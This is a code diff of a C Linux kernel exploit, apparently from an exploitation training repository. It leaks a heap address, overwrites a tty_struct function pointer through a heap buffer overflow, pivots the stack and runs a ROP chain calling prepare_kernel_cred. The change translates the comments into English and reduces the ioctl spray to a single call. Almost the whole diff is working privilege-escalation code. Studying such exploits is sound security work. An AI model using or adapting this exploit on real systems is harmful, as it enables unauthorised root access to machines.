@@ -86,13 +86,17 @@ int main() {
   g_buf = *(unsigned long*)&buf[0x438] - 0x438;
   printf("[+] g_buf = 0x%016lx\n", g_buf);
 
-  // 偽関数テーブルの書き込み
+  // When updating buf[0x418] = g_buf (as in src/03.stack_pivot/stack_pivot.c),
+  // the RIP is taken from g_buf[12]. Since there is not enough space to fit
+  // the rop chain (in 12 bytes), we will set tty_struct so that the RIP is taken
+  // from tty_struct[12] instead (buf[0x400+12]), freeing g_buf[12] for the rop
+  // chain.
   unsigned long *p = (unsigned long*)&buf[0x400];
   p[12] = rop_push_rdx_mov_ebp_415bffd9h_pop_rsp_r13_rbp;
   *(unsigned long*)&buf[0x418] = g_buf + 0x400;
 
-  // ROP chainの用意
-  unsigned long *chain = (unsigned long*)&buf;
+  // ROP chain
+  unsigned long *chain = (unsigned long*) buf;
   *chain++ = rop_pop_rdi;
   *chain++ = 0;
   *chain++ = addr_prepare_kernel_cred;
@@ -112,10 +116,10 @@ int main() {
   // Heap Buffer Overflow
   write(fd, buf, 0x500);
 
-  // RIPの制御
-  for (int i = 0; i < 100; i++) {
-    ioctl(spray[i], 0xdeadbeef, g_buf - 0x10); // pop r13,rbpの分を引いた
-  }
+  // Subtract 16 bytes to the value assigned to RDX, later pop'ed into RSP,
+  // since we need to make space in the stack for the two later pops (pop r13;
+  // pop rbp) in rop_push_rdx_mov_ebp_415bffd9h_pop_rsp_r13_rbp
+  ioctl(spray[50], 0xdeadbeef, g_buf - 0x10);
 
   getchar();
   return 0;
